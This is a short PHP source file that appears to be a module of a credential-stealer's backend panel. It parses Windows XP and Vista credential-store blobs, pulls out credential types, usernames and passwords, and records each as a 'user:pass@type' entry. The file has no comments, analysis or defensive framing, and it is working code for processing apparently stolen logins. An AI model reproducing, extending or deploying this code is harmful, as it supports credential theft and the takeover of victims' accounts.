<?php
class Module_cred extends Module_
{
    function ProcessVistaP($Data)
    {
        $stream = new Stream($Data, strlen($Data));

		$stream->getDWORD();
		$stream->getDWORD();
		$stream->getDWORD();
		$stream->getDWORD();
		$stream->getDWORD();
		$stream->getDWORD();
		$stream->getDWORD();
		$stream->Skip(12+8);
		
		$Type = trim($stream->getSTRW($stream->getDWORD()));
		$stream->Skip(12);
		
		$User = trim($stream->getSTRW($stream->getDWORD()));
		$Pass = trim($stream->getSTRW($stream->getDWORD()));
		
		$Res = $User. ":" . $Pass . "@" . $Type;
		if(strlen($Pass) && strlen($Res) < 100)
			$this->insert_other($Res);
    }

    function ProcessXP($Data)
    {
        $stream = new Stream($Data, strlen($Data));

		$stream->getWORD();
		while(TRUE)
		{
			if($stream->getDWORD() === NULL)
				break;
			
			$stream->getWORD();
			$stream->getDWORD();
			$stream->getDWORD();
			$stream->getDWORD();
			$stream->getDWORD();
			$stream->getDWORD();
			$stream->Skip(12+8);
			
			$Type = $stream->getSTRW($stream->getDWORD());
			if($Type === NULL)
				break;
			
			$stream->Skip(8);
			
			$User = $stream->getSTRW($stream->getDWORD());
			if($User === NULL)
				break;
			
			$Pass = $stream->getSTRW($stream->getDWORD());
			if($Pass === NULL)
				break;
			
			if(!strlen(trim($User)) || !strlen(trim($Pass)))
				break;
			
			$this->insert_other(trim($User). ":" . trim($Pass) . "@" . trim($Type));
		}
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
        {
            $this->ProcessXP($Data);
            break;
        }
        case 1:
        {
            $this->ProcessVistaP($Data);
            break;
        }

        default:
            return FALSE;
        }

        return TRUE;
    }
}
